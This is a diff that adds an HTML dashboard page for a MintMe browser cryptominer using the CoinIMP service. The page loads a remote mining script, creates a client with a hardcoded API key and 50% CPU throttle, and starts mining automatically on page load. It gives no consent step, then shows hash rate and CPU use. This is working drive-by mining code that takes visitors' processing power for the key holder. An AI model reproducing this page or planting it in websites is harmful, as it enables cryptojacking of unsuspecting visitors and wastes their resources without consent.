@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MINTME WEBMINER | COINIMP</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.0.1/css/bootstrap.min.css" integrity="sha512-Ez0cGzNzHR1tYAv56860NLspgUGuQw16GiOOp/I2LuTmpSK9xDXlgJz3XN4cnpXWDmkNBKXR/VDMTCnAaEooxA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <style>
+    body {
+      background-color: #222;
+      color: #fff;
+    }
+
+    #container {
+      height: 500px;
+      overflow: auto;
+      background-color: #000;
+      color: green;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+    }
+
+    .card {
+      border: none;
+      border-radius: 8px;
+    }
+
+    .card-header {
+      font-weight: bold;
+      font-size: 1.2em;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <h1 class="py-5 text-center">MINTME WEBMINER WITH COINIMP</h1>
+
+    <div id="status" class="py-3 text-center">
+      <span class="badge bg-danger">Stop</span>
+    </div>
+
+    <div class="row">
+      <div class="col-sm-4">
+        <div class="card text-bg-primary text-center mb-3">
+          <div class="card-header bg-success text-white">Hash/s</div>
+          <div class="card-body text-center">
+            <p class="card-text" id="hbs">0</p>
+          </div>
+        </div>
+      </div>
+      <div class="col-sm-4">
+        <div class="card text-bg-primary text-center mb-3">
+          <div class="card-header bg-info text-white">Hashes</div>
+          <div class="card-body text-center">
+            <p class="card-text" id="hashes">0</p>
+          </div>
+        </div>
+      </div>
+      <div class="col-sm-4">
+        <div class="card text-bg-primary text-center mb-3">
+          <div class="card-header bg-warning text-white">CPU</div>
+          <div class="card-body text-center">
+            <p class="card-text" id="cpu">0%</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://www.hostingcloud.racing/Q17m.js"></script>
+  <script>
+    // parse url
+    const urlParams = new URLSearchParams(window.location.search);
+    const params = Object.fromEntries(urlParams);
+
+    // Set default values for API key and CPU
+    const apiKey = '8a50c5f06f446eb80aa59533cfb0a36c0ebdfe05040732c6187cb75a8885df5c';
+    const cpu = 50; // Set CPU to 50
+    const throttle = 1 - (cpu / 100);
+    const statusEl = document.querySelector('#status');
+    const hbsEl = document.querySelector('#hbs');
+    const hashesEl = document.querySelector('#hashes');
+    const cpuEl = document.querySelector('#cpu');
+    const container = document.querySelector('#container');
+
+    const _client = new Client.Anonymous(apiKey, {
+      throttle, c: 'w'
+    });
+    _client.start();
+
+    _client.on('open', (args) => {
+      statusEl.innerHTML = `<span class="badge bg-success">Started</span>`;
+    });
+
+    _client.on('job', (args) => {
+      const hashes = _client.getTotalHashes();
+      const hbs = _client.getHashesPerSecond().toFixed(2);
+      const cpuPercentage = 100 - (_client.getThrottle() * 100);
+
+      hbsEl.innerHTML = hbs;
+      hashesEl.innerHTML = hashes;
+      cpuEl.innerHTML = `${cpuPercentage}%`;
+    });
+
+    window.miner = _client;
+  </script>
+</body>
+
+</html>
